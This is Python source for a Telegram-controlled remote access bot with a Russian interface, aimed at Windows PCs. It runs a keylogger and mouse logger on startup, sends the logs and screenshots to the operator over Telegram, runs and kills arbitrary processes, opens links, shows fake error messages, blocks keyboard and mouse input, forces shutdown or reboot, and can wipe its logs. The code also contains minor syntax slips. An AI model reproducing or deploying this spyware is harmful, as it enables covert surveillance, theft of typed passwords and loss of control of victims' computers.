import telebot
from datetime import datetime
import psutil
import platform
import mss
import os
import subprocess
import webbrowser
import pynput.keyboard
import pynput.mouse
import ctypes

bot = telebot.TeleBot(TOKEN)

AUTHORIZED_USERS = {TELEGRAM_ID}
startup_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
startup_message = f"💻 Компьютер включен. Время включения: {startup_time}"

base_path = "C:/bot" #ОБНОВИТЕ ПУТИ ЕСЛИ НАДО
log_file = os.path.join(base_path, 'activity_log.txt')
screenshot_file = os.path.join(base_path, 'screenshot.png')

def ensure_base_path_exists():
    if not os.path.exists(base_path):
        os.makedirs(base_path

ensure_base_path_exists()

def block_input(state):
    ctypes.windll.user32.BlockInput(state)

def log_action(action):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(log_file, 'a') as f:
        f.write(f"{timestamp} - {action}\n")

def on_key_press(key):
    try:
        log_action(f"Key pressed: {key.char}")
    except AttributeError:
        log_action(f"Special key pressed: {key}")

def start_keylogger():
    listener = pynput.keyboard.Listener(on_press=on_key_press)
    listener.start()

def on_click(x, y, button, pressed):
    if pressed:
        log_action(f"Mouse clicked at ({x}, {y}) with {button}")

def start_mouse_logger():
    mouse_listener = pynput.mouse.Listener(on_click=on_click)
    mouse_listener.start()

def main_menu():
    markup = telebot.types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    buttons = [
        telebot.types.KeyboardButton("🖥️ Системная информация"),
        telebot.types.KeyboardButton("🔒 Отключить клаву и мышь (Навсегда)"),
        telebot.types.KeyboardButton("🖼️ Скриншот"),
        telebot.types.KeyboardButton("🌐 Открыть ссылку"),
        telebot.types.KeyboardButton("❌ Фейковая ошибка"),
        telebot.types.KeyboardButton("⚙️ Процессы"),
        telebot.types.KeyboardButton("🔄 Запустить процесс"),
        telebot.types.KeyboardButton("🛑 Завершить процесс"),
        telebot.types.KeyboardButton("🔌 Выключение ПК"),
        telebot.types.KeyboardButton("🔄 Перезагрузка ПК"),
        telebot.types.KeyboardButton("📜 Отправить логи"),
        telebot.types.KeyboardButton("🗑️ Стереть логи"),
        telebot.types.KeyboardButton("💀 Самоубийство")
    ]
    markup.add(*buttons)
    return markup

for user_id in AUTHORIZED_USERS:
    bot.send_message(user_id, startup_message)
    main_menu()

user_states = {}

def is_authorized(user_id):
    return user_id in AUTHORIZED_USERS


@bot.message_handler(commands=['start'])
def send_welcome(message):
    if is_authorized(message.from_user.id):
        bot.reply_to(message, "👋 Привет! У вас есть доступ к этому боту.", reply_markup=main_menu())
    else:
        bot.reply_to(message, "🚫 У вас нет доступа к этому боту.")

@bot.message_handler(func=lambda message: message.text == "📜 Отправить логи")
def send_logs(message):
    if is_authorized(message.from_user.id):
        with open(log_file, 'rb') as f:
            bot.send_document(message.chat.id, f, caption="📜 Вот ваши логи:")
    else:
        bot.reply_to(message, "🚫 У вас нет доступа к этим функциям.")

@bot.message_handler(func=lambda message: message.text == "🖼️ Скриншот")
def send_screenshot(message):
    if is_authorized(message.from_user.id):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with mss.mss() as sct:
            filename = sct.shot(output=screenshot_file)
        with open(screenshot_file, 'rb') as photo:
            bot.send_photo(message.chat.id, photo, caption=f"📸 Скриншот сделан: {timestamp}")
        log_action("Screenshot taken")
    else:
        bot.reply_to(message, "🚫 У вас нет доступа к этим функциям.")

@bot.message_handler(func=lambda message: message.text == "🖥️ Системная информация")
def send_system_info(message):
    if is_authorized(message.from_user.id):
        uname = platform.uname()

        # Основная информация о системе
        system_info = f"""🖥️ Системная информация:

        🖥️ Система: {uname.system}
        🌐 Узел: {uname.node}
        🗂️ Выпуск: {uname.release}
        📅 Версия: {uname.version}
        """

        # Время работы системы
        boot_time_timestamp = psutil.boot_time()
        bt = datetime.fromtimestamp(boot_time_timestamp)
        uptime = datetime.now() - bt
        uptime_info = f"⏳ Время работы системы: {uptime}"

        # Информация о памяти
        memory = psutil.virtual_memory()
        memory_info = f"""🔢 Память:
        - Общая память: {memory.total / (1024 ** 3):.2f} ГБ
        - Доступная память: {memory.available / (1024 ** 3):.2f} ГБ
        - Используемая память: {memory.used / (1024 ** 3):.2f} ГБ
        - Процент использования: {memory.percent}%
        """

        # Информация о диске
        disk = psutil.disk_usage('/')
        disk_info = f"""💾 Диск:
        - Общий объем: {disk.total / (1024 ** 3):.2f} ГБ
        - Используемый объем: {disk.used / (1024 ** 3):.2f} ГБ
        - Свободный объем: {disk.free / (1024 ** 3):.2f} ГБ
        - Процент использования: {disk.percent}%
        """

        # Сводное сообщение
        info_message = f"{system_info}\n{memory_info}\n{disk_info}\n{uptime_info}"

        bot.send_message(message.chat.id, f"```\n{info_message}\n```", parse_mode='Markdown', reply_markup=main_menu())
        log_action("System information requested")
    else:
        bot.reply_to(message, "🚫 У вас нет доступа к этим функциям.")

@bot.message_handler(func=lambda message: message.text == "⚙️ Процессы")
def send_process_list(message):
    if is_authorized(message.from_user.id):
        page = 1
        processes, total_pages = get_processes(page)
        process_message = "\n".join([f"🆔 {p['pid']}: {p['name']} (CPU: {p['cpu_percent']}%)" for p in processes])
        process_message = f"📝 Процессы (страница {page}/{total_pages}):\n\n{process_message}"

        markup = telebot.types.InlineKeyboardMarkup()
        markup.row(
            telebot.types.InlineKeyboardButton("◀️ Назад", callback_data=f"prev_{page}"),
            telebot.types.InlineKeyboardButton("Вперед ▶️", callback_data=f"next_{page}")
        )

        bot.send_message(message.chat.id, process_message, reply_markup=markup)
        log_action("Process list requested")
    else:
        bot.reply_to(message, "🚫 У вас нет доступа к этим функциям.")

@bot.message_handler(func=lambda message: message.text == "🔄 Запустить процесс")
def prompt_start_process(message):
    if is_authorized(message.from_user.id):
        user_states[message.from_user.id] = 'waiting_for_process_name'
        bot.reply_to(message, "📝 Пожалуйста, отправьте имя процесса, который хотите запустить.")
    else:
        bot.reply_to(message, "🚫 У вас нет доступа к этим функциям.")

@bot.message_handler(func=lambda message: message.text == "🛑 Завершить процесс")
def prompt_kill_process(message):
    if is_authorized(message.from_user.id):
        user_states[message.from_user.id] = 'waiting_for_pid'
        bot.reply_to(message, "📝 Пожалуйста, отправьте PID процесса, который хотите завершить.")
    else:
        bot.reply_to(message, "🚫 У вас нет доступа к этим функциям.")

@bot.message_handler(func=lambda message: message.text == "🌐 Открыть ссылку")
def prompt_open_link(message):
    if is_authorized(message.from_user.id):
        user_states[message.from_user.id] = 'waiting_for_link'
        bot.reply_to(message, "📝 Пожалуйста, отправьте ссылку, которую хотите открыть в браузере.")
    else:
        bot.reply_to(message, "🚫 У вас нет доступа к этим функциям.")

@bot.message_handler(func=lambda message: message.text == "🔌 Выключение ПК")
def shutdown_system(message):
    if is_authorized(message.from_user.id):
        bot.reply_to(message, "🔌 Выключение компьютера...")
        log_action("System shutdown initiated")
        if platform.system() == "Windows":
            os.system("shutdown /s /t 1")
        elif platform.system() in ["Linux", "Darwin"]:
            os.system("sudo shutdown -h now")
        else:
            bot.reply_to(message, "❓ Неизвестная операционная система. Невозможно выполнить выключение.")
    else:
        bot.reply_to(message, "🚫 У вас нет доступа к этим функциям.")

@bot.message_handler(func=lambda message: message.text == "🗑️ Стереть логи")
def clear_logs(message):
    if is_authorized(message.from_user.id):
        try:
            if os.path.exists(log_file):
                os.remove(log_file)
                bot.reply_to(message, "🗑️ Логи успешно очищены.")
            else:
                bot.reply_to(message, "📂 Логи не найдены.")
        except Exception as e:
            bot.reply_to(message, f"❌ Ошибка при удалении логов: {e}")
    else:
        bot.reply_to(message, "🚫 У вас нет доступа к этим функциям.")

@bot.message_handler(func=lambda message: message.text == "🔄 Перезагрузка ПК")
def restart_system(message):
    if is_authorized(message.from_user.id):
        bot.reply_to(message, "🔄 Перезагрузка компьютера...")
        log_action("System restart initiated")
        if platform.system() == "Windows":
            os.system("shutdown /r /t 1")
        elif platform.system() in ["Linux", "Darwin"]:
            os.system("sudo reboot")
        else:
            bot.reply_to(message, "❓ Неизвестная операционная система. Невозможно выполнить перезагрузку.")
    else:
        bot.reply_to(message, "🚫 У вас нет доступа к этим функциям.")

@bot.message_handler(func=lambda message: message.text == "❌ Фейковая ошибка")
def prompt_fake_error(message):
    if is_authorized(message.from_user.id):
        user_states[message.from_user.id] = 'waiting_for_error_message'
        bot.reply_to(message, "📝 Пожалуйста, отправьте текст для фейковой ошибки.")
    else:
        bot.reply_to(message, "🚫 У вас нет доступа к этим функциям.")

@bot.message_handler(func=lambda message: message.from_user.id in user_states and user_states[
    message.from_user.id] == 'waiting_for_process_name')
def handle_start_process(message):
    if is_authorized(message.from_user.id):
        process_name = message.text
        try:
            subprocess.Popen(process_name)
            bot.reply_to(message, f"🚀 Процесс '{process_name}' успешно запущен.")
            log_action(f"Process started: {process_name}")
        except Exception as e:
            bot.reply_to(message, f"❌ Ошибка при запуске процесса: {e}")
        finally:
            del user_states[message.from_user.id]
            bot.send_message(message.chat.id, "🔄 Вернуться в главное меню", reply_markup=main_menu())
    else:
        bot.reply_to(message, "🚫 У вас нет доступа к этим функциям.")

@bot.message_handler(
    func=lambda message: message.from_user.id in user_states and user_states[message.from_user.id] == 'waiting_for_pid')
def handle_kill_process(message):
    if is_authorized(message.from_user.id):
        try:
            pid = int(message.text)
            process = psutil.Process(pid)
            process.terminate()
            bot.reply_to(message, f"🛑 Процесс с PID {pid} успешно завершен.")
            log_action(f"Process terminated: PID {pid}")
        except psutil.NoSuchProcess:
            bot.reply_to(message, f"❌ Процесс с PID {pid} не найден.")
        except Exception as e:
            bot.reply_to(message, f"❌ Ошибка при завершении процесса: {e}")
        finally:
            del user_states[message.from_user.id]
            bot.send_message(message.chat.id, "🔄 Вернуться в главное меню", reply_markup=main_menu())
    else:
        bot.reply_to(message, "🚫 У вас нет доступа к этим функциям.")

@bot.message_handler(func=lambda message: message.from_user.id in user_states and user_states[
    message.from_user.id] == 'waiting_for_link')
def handle_open_link(message):
    if is_authorized(message.from_user.id):
        link = message.text
        try:
            webbrowser.open(link)
            bot.reply_to(message, f"🌐 Ссылка '{link}' открыта в браузере.")
            log_action(f"Link opened: {link}")
        except Exception as e:
            bot.reply_to(message, f"❌ Ошибка при открытии ссылки: {e}")
        finally:
            del user_states[message.from_user.id]
    else:
        bot.reply_to(message, "🚫 У вас нет доступа к этим функциям.")

@bot.message_handler(func=lambda message: message.from_user.id in user_states and user_states[
    message.from_user.id] == 'waiting_for_error_message')
def handle_fake_error(message):
    if is_authorized(message.from_user.id):
        error_message = message.text
        if platform.system() == "Windows":
            subprocess.run(["msg", "*", error_message])
            log_action(f"Fake error shown with message: {error_message}")
        else:
            bot.reply_to(message, "❓ Фейковые ошибки поддерживаются только на Windows.")
        del user_states[message.from_user.id]
    else:
        bot.reply_to(message, "🚫 У вас нет доступа к этим функциям.")

@bot.callback_query_handler(func=lambda call: call.data.startswith("prev_") or call.data.startswith("next_"))
def process_pagination(call):
    if is_authorized(call.from_user.id):
        page = int(call.data.split('_')[1])
        direction = call.data.split('_')[0]

        if direction == "next":
            page += 1
        elif direction == "prev":
            page -= 1

        processes, total_pages = get_processes(page)

        if page > total_pages:
            page = 1
        elif page < 1:
            page = total_pages

        process_message = "\n".join([f"🆔 {p['pid']}: {p['name']} (CPU: {p['cpu_percent']}%)" for p in processes])
        process_message = f"📝 Процессы (страница {page}/{total_pages}):\n\n{process_message}"

        markup = telebot.types.InlineKeyboardMarkup()
        markup.row(
            telebot.types.InlineKeyboardButton("◀️ Назад", callback_data=f"prev_{page}"),
            telebot.types.InlineKeyboardButton("Вперед ▶️", callback_data=f"next_{page}")
        )

        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=process_message,
                              reply_markup=markup)
    else:
        bot.answer_callback_query(call.id, "🚫 У вас нет доступа к этим функциям.")

@bot.message_handler(func=lambda message: message.text == "🔒 Отключить клаву и мышь")
def disable_input(message):
    if is_authorized(message.from_user.id):
        try:
            block_input(True)
            bot.reply_to(message, "🔒 Клавиатура и мышь отключены.")
        except Exception as e:
            bot.reply_to(message, f"❌ Ошибка при отключении ввода: {e}")
    else:
        bot.reply_to(message, "🚫 У вас нет доступа к этим функциям.")

def get_processes(page: int, per_page: int = 15):
    processes = [proc.info for proc in psutil.process_iter(['pid', 'name', 'cpu_percent'])]
    processes.sort(key=lambda x: x['cpu_percent'], reverse=True)

    total_pages = (len(processes) + per_page - 1) // per_page
    start = (page - 1) * per_page
    end = start + per_page
    processes_on_page = processes[start:end]

    return processes_on_page, total_pages

@bot.message_handler(func=lambda message: message.text == "💀 Самоубийство")
def bot_suicide(message):
    if is_authorized(message.from_user.id):
        bot.reply_to(message, "Вы уверены, что хотите завершить работу бота? Напишите 'Да' для подтверждения...")
        user_states[message.from_user.id] = 'confirming_suicide'
    else:
        bot.reply_to(message, "🚫 У вас нет доступа к этим функциям.")

@bot.message_handler(func=lambda message: user_states.get(message.from_user.id) == 'confirming_suicide')
def confirm_suicide(message):
    if message.text.lower() in ['да', 'yes', 'д', 'y']:
        bot.reply_to(message, "💀 Бот завершает свою работу...")
        os._exit(0)  # Завершение работы бота
    else:
        bot.reply_to(message, "❌ Подтверждение не получено. Бот продолжает работу.")
    del user_states[message.from_user.id]

@bot.message_handler(func=lambda message: True)
def handle_unrecognized(message):
    if is_authorized(message.from_user.id):
        bot.reply_to(message, "❓ Команда не распознана. Пожалуйста, выберите одну из предложенных опций.")
    else:
        bot.reply_to(message, "🚫 У вас нет доступа к этим функциям.")

start_keylogger()
start_mouse_logger()

bot.polling()

